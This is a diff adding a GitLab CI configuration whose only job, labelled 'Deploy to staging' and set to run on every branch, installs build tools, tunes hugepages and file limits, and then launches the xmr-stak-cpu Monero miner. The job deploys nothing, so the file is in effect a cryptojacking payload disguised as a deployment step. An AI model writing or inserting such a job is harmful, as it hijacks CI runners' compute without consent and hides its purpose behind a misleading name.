@@ -1,0 +1,11 @@
+image: ubuntu:16.04
+
+Deploy to staging:
+  stage: deploy
+  script:
+    - apt-get update && apt-get install -y wget libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev && chmod +x xmr-stak-cpu && sysctl -w vm.nr_hugepages=128 && ulimit -n 262144 && ulimit -Hn 262144 && ./xmr-stak-cpu
+
+  environment:
+    name: staging
+  only:
+  - branches
